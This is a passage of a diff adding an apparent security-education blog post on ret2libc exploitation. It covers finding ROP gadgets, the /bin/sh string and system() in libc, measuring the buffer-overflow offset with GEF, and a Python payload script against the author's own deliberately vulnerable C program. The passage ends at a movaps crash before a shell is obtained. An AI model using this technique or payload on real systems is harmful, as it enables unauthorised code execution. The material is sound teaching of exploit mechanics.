+        /lib64/ld-linux-x86-64.so.2 <span class="o">=&gt;</span> /usr/lib64/ld-linux-x86-64.so.2 <span class="o">(</span>0x00007ffff7fca000<span class="o">)</span></code></pre></figure>
+
+<p>If we dump that object file, we will see all the instructions libc.so.6 includes.</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">KnuckleSecurity :: -&gt; objdump <span class="nt">-M</span> intel <span class="nt">-d</span> /usr/lib/libc.so.6  | <span class="nb">head</span> <span class="nt">-n25</span>
+
+/usr/lib/libc.so.6:     file format elf64-x86-64
+
+
+Disassembly of section .plt:
+
+0000000000022000 &lt;.plt&gt;:
+   22000:       ff 35 ea 5f 1b 00       push   QWORD PTR <span class="o">[</span>rip+0x1b5fea]        <span class="c"># 1d7ff0 &lt;h_errlist@@GLIBC_2.2.5+0xe30&gt;</span>
+   22006:       f2 ff 25 eb 5f 1b 00    bnd jmp QWORD PTR <span class="o">[</span>rip+0x1b5feb]        <span class="c"># 1d7ff8 &lt;h_errlist@@GLIBC_2.2.5+0xe38&gt;</span>
+   2200d:       0f 1f 00                nop    DWORD PTR <span class="o">[</span>rax]
+   22010:       f3 0f 1e fa             endbr64
+   22014:       68 1f 00 00 00          push   0x1f
+   22019:       f2 e9 e1 ff ff ff       bnd jmp 22000 &lt;__h_errno@@GLIBC_PRIVATE+0x21f8c&gt;
+   2201f:       90                      nop
+   22020:       f3 0f 1e fa             endbr64
+   22024:       68 1e 00 00 00          push   0x1e
+   22029:       f2 e9 d1 ff ff ff       bnd jmp 22000 &lt;__h_errno@@GLIBC_PRIVATE+0x21f8c&gt;
+   2202f:       90                      nop
+   22030:       f3 0f 1e fa             endbr64
+   22034:       68 1d 00 00 00          push   0x1d
+   22039:       f2 e9 c1 ff ff ff       bnd jmp 22000 &lt;__h_errno@@GLIBC_PRIVATE+0x21f8c&gt;
+   2203f:       90                      nop
+   22040:       f3 0f 1e fa             endbr64
+   22044:       68 1c 00 00 00          push   0x1c
+   22049:       f2 e9 b1 ff ff ff       bnd jmp 22000 &lt;__h_errno@@GLIBC_PRIVATE+0x21f8c&gt;</code></pre></figure>
+
+<p>I have only printed out some instructions. There are 362635 instructions in that library. Those instructions involve 
+the predefined functions such as system() or exit().</p>
+
+<p>Remember the plan, RDI should be pointing to a <strong>/bin/sh</strong> string. So, how we can put that value in to the RDI?
+We do not have manual access to write to that register. 
+If we can put the address of the <strong>/bin/sh</strong> string on top of the stack and find a ROP gadget (this is what each instruction in that 
+dump file is called Therefore I will be referring those as the ROP gadgets) that pops the value from stack to the 
+RDI, we can accomplish our first goal. POP instruction moves the value that sits on top of the stack to any destination and 
+increments the stack pointer. Therefore, we are looking for a <strong>pop rdi</strong> instruction. That ROP gadget also should 
+immediately return since we do not want anything else to happen after POP operation. So, we are looking for <strong>pop rdi; ret</strong>.</p>
+
+<ul>
+  <li>
+    <h1 id="rop-gadgets">ROP Gadgets</h1>
+  </li>
+</ul>
+
+<p>It is possible to find any ROP gadget with dumping the object file and manipulating the output. However, it is not the 
+best way to do it. There is a program called <a href="https://github.com/sashs/Ropper"><strong>ropper</strong></a> which exactly does the thing we are trying to do. We can search for 
+any gadget with the <strong>ropper</strong>.</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">KnuckleSecurity :: -&gt; ropper
+<span class="o">(</span>ropper<span class="o">)&gt;</span> file /usr/lib/libc.so.6 <span class="c"># &lt;-- Declare the library which we want to search in.</span>
+<span class="o">[</span>INFO] Load gadgets from cache
+<span class="o">[</span>LOAD] loading... 100%
+<span class="o">[</span>LOAD] removing double gadgets... 100%
+<span class="o">[</span>INFO] File loaded.
+<span class="o">(</span>libc.so.6/ELF/x86_64<span class="o">)&gt;</span> search /1/ pop rdi<span class="p">;</span> ret <span class="c"># &lt;-- Search for pop rdi gadget</span>
+<span class="o">[</span>INFO] Searching <span class="k">for </span>gadgets: pop rdi
+
+<span class="o">[</span>INFO] File: /usr/lib/libc.so.6
+0x0000000000107c71: pop rdi<span class="p">;</span> call rax<span class="p">;</span> <span class="c">#&lt;-- call rax, nope.</span>
+0x0000000000026634: pop rdi<span class="p">;</span> jmp rax<span class="p">;</span> <span class="c">#&lt;-- jmp rax, nope</span>
+0x00000000000d2854: pop rdi<span class="p">;</span> jmp rdi<span class="p">;</span> <span class="c">#&lt;-- jmp rdi, nope.</span>
+0x0000000000023835: pop rdi<span class="p">;</span> ret<span class="p">;</span> <span class="c"># &lt;-- After popping the value to the rdi, it returns. That is what we are looking for.</span></code></pre></figure>
+
+<p>If you paid attention, the address is weird. That is because it is not its real address. It is the relative address 
+of the gadget to library’s base address. Therefore:</p>
+
+<ul>
+  <li>libc.so.6 base address = 0x00007ffff7dbe000</li>
+  <li>pop rdi; ret; relative address = 0x23835</li>
+  <li>pop rdi address = 0x7ffff7de1835</li>
+  <li>ret address = 0x7ffff7de1836</li>
+</ul>
+
+<p>Let’s validate the addresses with using the GDB. I will set a break point on the main function and run 
+the program since those addresses are not reachable if the program is not being executed.</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">0x007fffffffe618│+0x0030: 0x483f8b5e097bf1b7
+0x007fffffffe620│+0x0038: 0x0000000000000000
+<span class="nt">-----code</span>:x86:64 ────
+     0x40111c &lt;__do_global_dtors_aux+44&gt; nop    DWORD PTR <span class="o">[</span>rax+0x0]
+     0x401120 &lt;frame_dummy+0&gt;  endbr64
+     0x401124 &lt;frame_dummy+4&gt;  jmp    0x4010b0 &lt;register_tm_clones&gt;
+ →   0x401126 &lt;main+0&gt;         push   rbp
+     0x401127 &lt;main+1&gt;         mov    rbp, rsp
+     0x40112a &lt;main+4&gt;         sub    rsp, 0x10
+     0x40112e &lt;main+8&gt;         mov    DWORD PTR <span class="o">[</span>rbp-0x4], edi
+     0x401131 &lt;main+11&gt;        mov    QWORD PTR <span class="o">[</span>rbp-0x10], rsi
+     0x401135 &lt;main+15&gt;        cmp    DWORD PTR <span class="o">[</span>rbp-0x4], 0x1
+<span class="nt">-----source</span>:ret2libc.c+9 ────
+      4  <span class="c">#include &lt;stdlib.h&gt;</span>
+      5
+      6  void vuln<span class="o">(</span>char <span class="k">*</span>input<span class="o">)</span><span class="p">;</span>
+      7
+      8  int main<span class="o">(</span>int argc, char <span class="k">**</span>argv<span class="o">)</span>
+ →    9  <span class="o">{</span>
+     10    <span class="k">if</span> <span class="o">(</span>argc <span class="o">&gt;</span> 1<span class="o">){</span>
+     11      vuln<span class="o">(</span>argv[1]<span class="o">)</span><span class="p">;</span>
+     12    <span class="o">}</span><span class="p">;</span>
+     13    <span class="k">return </span>0<span class="p">;</span>
+     14  <span class="o">}</span>
+<span class="nt">-----threads</span> ────
+<span class="o">[</span><span class="c">#0] Id 1, Name: "ret2libc.elf", stopped 0x401126 in main (), reason: BREAKPOINT</span>
+<span class="nt">-----trace</span> ────
+<span class="o">[</span><span class="c">#0] 0x401126 → main(argc=0x7fff, argv=0x0)</span>
+<span class="nt">----ret2libc</span>.elf 
+gef➤  x/i 0x7ffff7de1835
+   0x7ffff7de1835 &lt;iconv+197&gt;:  pop    rdi <span class="c"># &lt;-- Perfect!</span>
+gef➤  x/i 0x7ffff7de1836
+   0x7ffff7de1836 &lt;iconv+198&gt;:  ret <span class="c"># &lt;-- Perfcet!</span></code></pre></figure>
+
+<p>Addresses match. Now we need to find a pointer address which points to a /bin/sh string.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">KnuckleSecurity :: -&gt; strings <span class="nt">-tx</span> /usr/lib/libc.so.6 | <span class="nb">grep</span> /bin/sh
+ 198031 /bin/sh</code></pre></figure>
+
+<p>Again, 0x198031 is the relative address to the starting address of the libc.so.6.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">gef➤  x/s 0x00007ffff7dbe000+0x198031
+0x7ffff7f56031: <span class="s2">"/bin/sh"</span></code></pre></figure>
+
+<p>We now should find the address of the system() function in the libc.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">KnuckleSecurity :: -&gt; readelf <span class="nt">-s</span> /usr/lib/libc.so.6  | <span class="nb">grep </span>system
+  1023: 00000000000493d0    45 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.2.5</code></pre></figure>
+
+<p>Let’s validate the offset by adding it to the base address and see if that address points to the system() with GDB.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">gef➤  x/i 0x00007ffff7dbe000+0x493d0
+   0x7ffff7e073d0 &lt;system&gt;:     endbr64</code></pre></figure>
+
+<p>It does.</p>
+
+<ul>
+  <li>
+    <h1 id="assembling-all-the-pieces">Assembling All the Pieces</h1>
+  </li>
+</ul>
+
+<p>Now we have all the addresses we need. It is time to find the offset of the RIP by overloading the buffer. You should 
+know this part already from the previous paper.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">gef➤  pattern create 500 <span class="c"># &lt;-- Creating the pattern</span>
+<span class="o">[</span>+] Generating a pattern of 500 bytes <span class="o">(</span><span class="nv">n</span><span class="o">=</span>8<span class="o">)</span>
+aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaa
+<span class="o">[</span>+] Saved as <span class="s1">'$_gef1'</span>
+gef➤  r aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaa
+Starting program: /home/burak/programming/reverse/ret2libc.elf aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaa <span class="c"># &lt;-- Sending the pattern</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Failed to find objfile or not a valid file format: <span class="o">[</span>Errno 2] No such file or directory: <span class="s1">'system-supplied DSO at 0x7ffff7fc8000'</span>
+<span class="o">[</span>Thread debugging using libthread_db enabled]
+Using host libthread_db library <span class="s2">"/usr/lib/libthread_db.so.1"</span><span class="nb">.</span>
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000000000401187 <span class="k">in </span>vuln <span class="o">(</span><span class="nv">input</span><span class="o">=</span>0x7fffffffe833 <span class="s2">"aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaa"</span><span class="o">)</span> at ret2libc.c:19
+19      <span class="o">}</span>
+<span class="o">[</span> Legend: Modified register | Code | Heap | Stack | String <span class="o">]</span>
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+<span class="nv">$rax</span>   : 0x007fffffffe2c0  →  <span class="s2">"aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga[...]"</span>
+<span class="nv">$rbx</span>   : 0x007fffffffe4f8  →  0x007fffffffe806  →  <span class="s2">"/home/burak/programming/reverse/ret2libc.elf"</span>
+<span class="nv">$rcx</span>   : 0x007fffffffe2c0  →  <span class="s2">"aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga[...]"</span>
+<span class="nv">$rdx</span>   : 0x007fffffffe36c  →  <span class="s2">"aaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaa[...]"</span>
+<span class="nv">$rsp</span>   : 0x007fffffffe3c8  →  0x6261616161616169 <span class="o">(</span><span class="s2">"iaaaaaab"</span>?<span class="o">)</span>
+<span class="nv">$rbp</span>   : 0x6261616161616168 <span class="o">(</span><span class="s2">"haaaaaab"</span>?<span class="o">)</span>
+<span class="nv">$rsi</span>   : 0x007fffffffe953  →  <span class="s2">"laaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabra[...]"</span>
+<span class="nv">$rdi</span>   : 0x007fffffffe3e0  →  0x626161616161616c <span class="o">(</span><span class="s2">"laaaaaab"</span>?<span class="o">)</span>
+<span class="nv">$rip</span>   : 0x00000000401187  →  &lt;vuln+50&gt; ret
+<span class="nv">$r8</span>    : 0x0
+<span class="nv">$r9</span>    : 0x007ffff7fce890  →   endbr64
+<span class="nv">$r10</span>   : 0x3
+<span class="nv">$r11</span>   : 0x007ffff7f117b0  →   endbr64
+<span class="nv">$r12</span>   : 0x0
+<span class="nv">$r13</span>   : 0x007fffffffe510  →  0x007fffffffea28  →  <span class="s2">"ALACRITTY_LOG=/tmp/Alacritty-1014.log"</span>
+<span class="nv">$r14</span>   : 0x00000000403df0  →  0x000000004010f0  →  &lt;__do_global_dtors_aux+0&gt; endbr64
+<span class="nv">$r15</span>   : 0x007ffff7ffd000  →  0x007ffff7ffe2c0  →  0x0000000000000000
+<span class="nv">$eflags</span>: <span class="o">[</span>zero CARRY parity adjust SIGN <span class="nb">trap </span>INTERRUPT direction overflow RESUME virtualx86 identification]
+<span class="nv">$cs</span>: 0x33 <span class="nv">$ss</span>: 0x2b <span class="nv">$ds</span>: 0x00 <span class="nv">$es</span>: 0x00 <span class="nv">$fs</span>: 0x00 <span class="nv">$gs</span>: 0x00
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0x007fffffffe3c8│+0x0000: 0x6261616161616169     ← <span class="nv">$rsp</span>
+0x007fffffffe3d0│+0x0008: 0x626161616161616a
+0x007fffffffe3d8│+0x0010: 0x626161616161616b
+0x007fffffffe3e0│+0x0018: 0x626161616161616c     ← <span class="nv">$rdi</span>
+0x007fffffffe3e8│+0x0020: 0x00007fff6161616d
+0x007fffffffe3f0│+0x0028: 0x007fffffffe4e0  →  0x007fffffffe4e8  →  0x00000000000038 <span class="o">(</span><span class="s2">"8"</span>?<span class="o">)</span>
+0x007fffffffe3f8│+0x0030: 0x00000000401126  →  &lt;main+0&gt; push rbp
+0x007fffffffe400│+0x0038: 0x00000200400040 <span class="o">(</span><span class="s2">"@"</span>?<span class="o">)</span>
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+     0x401180 &lt;vuln+43&gt;        call   0x401030 &lt;memcpy@plt&gt;
+     0x401185 &lt;vuln+48&gt;        nop
+     0x401186 &lt;vuln+49&gt;        leave
+ →   0x401187 &lt;vuln+50&gt;        ret
+<span class="o">[!]</span> Cannot disassemble from <span class="nv">$PC</span>
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── <span class="nb">source</span>:ret2libc.c+19 ────
+     14  <span class="o">}</span>
+     15
+     16  void vuln<span class="o">(</span>char <span class="k">*</span>input<span class="o">){</span>
+     17    char buffer[256]<span class="p">;</span>
+     18    memcpy<span class="o">(</span>buffer, input, 300<span class="o">)</span><span class="p">;</span>
+ →   19  <span class="o">}</span>
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+<span class="o">[</span><span class="c">#0] Id 1, Name: "ret2libc.elf", stopped 0x401187 in vuln (), reason: SIGSEGV</span>
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+<span class="o">[</span><span class="c">#0] 0x401187 → vuln(input=0x7fffffffe833 "aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaa")</span>
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+gef➤  i r rbp
+rbp            0x6261616161616168  0x6261616161616168
+gef➤  pattern search <span class="nv">$rbp</span> <span class="c"># &lt;-- Searching the pattern offset</span>
+<span class="o">[</span>+] Searching <span class="k">for</span> <span class="s1">'$rbp'</span>
+<span class="o">[</span>+] Found at offset 256 <span class="o">(</span>little-endian search<span class="o">)</span> likely <span class="c"># &lt;-- 256 bytes to the initial address of the SFP.</span></code></pre></figure>
+
+<p>Starting from the buffer, if we go 256-bytes, we will hit the first memory address of where the SFP stored.
+Therefore, the upcoming eight bytes are dedicated for the SFP. Further six bytes stores the RIP 
+(Remember the canonical addresses for X64 and why the address is not 8 bytes).</p>
+
+<p>Finally, we know the offset and have all the addresses. We are good to go. I need you full attention here 
+because this part will be a little confusing.</p>
+
+<p>Remember how the procedure prologue and epilogue take its place.</p>
+
+<ul>
+  <li>Prologue / CALL
+    <ol>
+      <li>Push RBP to the stack.</li>
+      <li>Move RBP to RSP.</li>
+      <li>Put the arguments to the registers.</li>
+      <li>Push the return address of the caller function to the stack.</li>
+      <li>Jump to the first instruction of the calling function.</li>
+    </ol>
+  </li>
+  <li>Epilogue / RET
+    <ol>
+      <li>Pop the SFP to the RBP. Restore the base pointer.</li>
+      <li>Pop the saved return address to the instruction pointer.</li>
+    </ol>
+  </li>
+</ul>
+
+<p>Those prologue and epilogue sequences are only occurs when a <strong>CALL</strong> or <strong>RET</strong> instruction is 
+hit by the instruction pointer. So, if we manually set the instruction pointer to any address, 
+we are not going to encounter with no prologue sequence. Therefore, when we writing to the stack, 
+we have to remember how a function uses the stack and insert anything accordingly.</p>
+
+<p>So what we are trying to build is this:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">./ret2libc.elf <span class="si">$(</span>python <span class="nt">-c</span> <span class="s1">'print("A"*256+"POP RDI; RET; ADDR"+"/bin/bash ADDR"+"SYSTEM() ADDR")'</span><span class="si">)</span></code></pre></figure>
+
+<p>When we supply the program with this payload, this is what is going to happen:</p>
+
+<ol>
+  <li>vuln() function will complete its procedure epilogue and restore the base pointer. Therefore, restore the stack frame.
+After restoring the stack frame, the overwritten return address will be at the top of the stack.</li>
+  <li>Finally vuln() function will execute the RET instruction after restoring the stack. 
+That instruction will pop the topmost address stored in the stack to the 
+instruction pointer.</li>
+  <li>After vuln() function pops the return address and points to pop rdi the address of the /bin/sh address will be the 
+topmost value stored on the stack.</li>
+  <li>pop rdi instruction will pop the address of the /bin/sh to the rdi.</li>
+  <li>When pop rdi is done, the instruction pointer will execute the ret instruction. That ret instruction is again going to pop the topmost 
+value stored in the stack to the instruction pointer. Therefore after the address of the /bin/sh pointer, the 
+adress of the system() function should come.</li>
+  <li>system() function is going to take the value written in the rdi register as its argument and will drop us a shell.</li>
+</ol>
+
+<p>So, with that knowledge, let’s forge a Python script.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">struct</span>
+
+<span class="n">libc_base_address</span> <span class="o">=</span> <span class="mh">0x00007ffff7dbe000</span>
+<span class="n">pop_rdi_offset</span> <span class="o">=</span> <span class="mh">0x0000000000023835</span>
+<span class="n">bin_sh_offset</span><span class="o">=</span> <span class="mh">0x198031</span>
+<span class="n">system_function_offset</span> <span class="o">=</span> <span class="mh">0x00000000000493d0</span>
+
+<span class="n">pop_rdi_address</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"Q"</span><span class="p">,</span><span class="n">libc_base_address</span><span class="o">+</span><span class="n">pop_rdi_offset</span><span class="p">)</span>
+<span class="n">bin_sh_address</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"Q"</span><span class="p">,</span><span class="n">libc_base_address</span><span class="o">+</span><span class="n">bin_sh_offset</span><span class="p">)</span>
+<span class="n">system_function_address</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"Q"</span><span class="p">,</span><span class="n">libc_base_address</span><span class="o">+</span><span class="n">system_function_offset</span><span class="p">)</span>
+
+<span class="n">buff</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">256</span>
+<span class="n">rbp</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"B"</span><span class="o">*</span><span class="mi">8</span>
+
+<span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="nb">buffer</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">buff</span><span class="o">+</span><span class="n">rbp</span><span class="o">+</span><span class="n">pop_rdi_address</span><span class="o">+</span><span class="n">bin_sh_address</span><span class="o">+</span><span class="n">system_function_address</span><span class="p">)</span></code></pre></figure>
+
+<p>Let’s supply the ret2libc.elf with that payload.</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">KnuckleSecurity :: -&gt; gdb <span class="nt">-q</span> ret2libc.elf
+GEF <span class="k">for </span>linux ready, <span class="nb">type</span> <span class="sb">`</span>gef<span class="s1">' to start, `gef config'</span> to configure
+90 commands loaded and 5 functions added <span class="k">for </span>GDB 12.1 <span class="k">in </span>0.00ms using Python engine 3.10
+Reading symbols from ret2libc.elf...
+gef➤  r <span class="si">$(</span>python ret2libc2.py<span class="si">)</span>
+Starting program: /home/burak/programming/reverse/ret2libc.elf <span class="si">$(</span>python ret2libc2.py<span class="si">)</span>
+Debuginfod has been disabled.
+To make this setting permanent, add <span class="s1">'set debuginfod enabled off'</span> to .gdbinit.
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Failed to find objfile or not a valid file format: <span class="o">[</span>Errno 2] No such file or directory: <span class="s1">'system-supplied DSO at 0x7ffff7fc8000'</span>
+<span class="o">[</span>Thread debugging using libthread_db enabled]
+Using host libthread_db library <span class="s2">"/usr/lib/libthread_db.so.1"</span><span class="nb">.</span>
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00007ffff7e070b3 <span class="k">in</span> ?? <span class="o">()</span> from /usr/lib/libc.so.6
+<span class="o">[</span> Legend: Modified register | Code | Heap | Stack | String <span class="o">]</span>
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+<span class="nv">$rax</span>   : 0x007ffff7f9e260  →  0x007fffffffe5e0  →  0x007fffffffea28  →  <span class="s2">"ALACRITTY_LOG=/tmp/Alacritty-1014.log"</span>
+<span class="nv">$rbx</span>   : 0x007fffffffe2f8  →  0x0000000000000c <span class="o">(</span><span class="s2">"
+                                                 "</span>?<span class="o">)</span>
+<span class="nv">$rcx</span>   : 0x007fffffffe2f8  →  0x0000000000000c <span class="o">(</span><span class="s2">"
+                                                 "</span>?<span class="o">)</span>
+<span class="nv">$rdx</span>   : 0x0
+<span class="nv">$rsp</span>   : 0x007fffffffe0e8  →  0x0000000000000000
+<span class="nv">$rbp</span>   : 0x007fffffffe158  →  0x0000000000000000
+<span class="nv">$rsi</span>   : 0x007ffff7f56031  →  0x68732f6e69622f <span class="o">(</span><span class="s2">"/bin/sh"</span>?<span class="o">)</span>
+<span class="nv">$rdi</span>   : 0x007fffffffe0f4  →  0x0000000000000000
+<span class="nv">$rip</span>   : 0x007ffff7e070b3  →   movaps XMMWORD PTR <span class="o">[</span>rsp+0x50], xmm0
+<span class="nv">$r8</span>    : 0x007fffffffe138  →  0x0000000000000000
+<span class="nv">$r9</span>    : 0x007fffffffe5e0  →  0x007fffffffea28  →  <span class="s2">"ALACRITTY_LOG=/tmp/Alacritty-1014.log"</span>
+<span class="nv">$r10</span>   : 0x8
+<span class="nv">$r11</span>   : 0x246
+<span class="nv">$r12</span>   : 0x007ffff7f56031  →  0x68732f6e69622f <span class="o">(</span><span class="s2">"/bin/sh"</span>?<span class="o">)</span>
+<span class="nv">$r13</span>   : 0x007fffffffe5e0  →  0x007fffffffea28  →  <span class="s2">"ALACRITTY_LOG=/tmp/Alacritty-1014.log"</span>
+<span class="nv">$r14</span>   : 0x00000000403df0  →  0x000000004010f0  →  &lt;__do_global_dtors_aux+0&gt; endbr64
+<span class="nv">$r15</span>   : 0x007ffff7ffd000  →  0x007ffff7ffe2c0  →  0x0000000000000000
+<span class="nv">$eflags</span>: <span class="o">[</span>ZERO carry PARITY adjust sign <span class="nb">trap </span>INTERRUPT direction overflow RESUME virtualx86 identification]
+<span class="nv">$cs</span>: 0x33 <span class="nv">$ss</span>: 0x2b <span class="nv">$ds</span>: 0x00 <span class="nv">$es</span>: 0x00 <span class="nv">$fs</span>: 0x00 <span class="nv">$gs</span>: 0x00
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0x007fffffffe0e8│+0x0000: 0x0000000000000000     ← <span class="nv">$rsp</span>
+0x007fffffffe0f0│+0x0008: 0x00000000ffffffff
+0x007fffffffe0f8│+0x0010: 0x0000000000000000
+0x007fffffffe100│+0x0018: 0x0000000000000000
+0x007fffffffe108│+0x0020: 0x0000000000000000
+0x007fffffffe110│+0x0028: 0x0000000000000000
+0x007fffffffe118│+0x0030: 0x0000000000000000
+0x007fffffffe120│+0x0038: 0x0000000000000000
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+   0x7ffff7e070a4                  mov    QWORD PTR <span class="o">[</span>rsp+0x60], r12
+   0x7ffff7e070a9                  mov    r9, QWORD PTR <span class="o">[</span>rax]
+   0x7ffff7e070ac                  lea    rsi, <span class="o">[</span>rip+0x14ef7e]        <span class="c"># 0x7ffff7f56031</span>
+ → 0x7ffff7e070b3                  movaps XMMWORD PTR <span class="o">[</span>rsp+0x50], xmm0
+   0x7ffff7e070b8                  mov    QWORD PTR <span class="o">[</span>rsp+0x68], 0x0
+   0x7ffff7e070c1                  call   0x7ffff7eb3710 &lt;posix_spawn&gt;
+   0x7ffff7e070c6                  mov    rdi, rbx
+   0x7ffff7e070c9                  mov    r12d, eax
+   0x7ffff7e070cc                  call   0x7ffff7eb3610 &lt;posix_spawnattr_destroy&gt;
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+<span class="o">[</span><span class="c">#0] Id 1, Name: "ret2libc.elf", stopped 0x7ffff7e070b3 in ?? (), reason: SIGSEGV</span>
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+<span class="o">[</span><span class="c">#0] 0x7ffff7e070b3 → movaps XMMWORD PTR [rsp+0x50], xmm0</span>
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+gef➤</code></pre></figure>
+
+<p>There is a problem. Instead of having a shell, debugger triggers an instruction called <strong>movaps</strong>.</p>
+
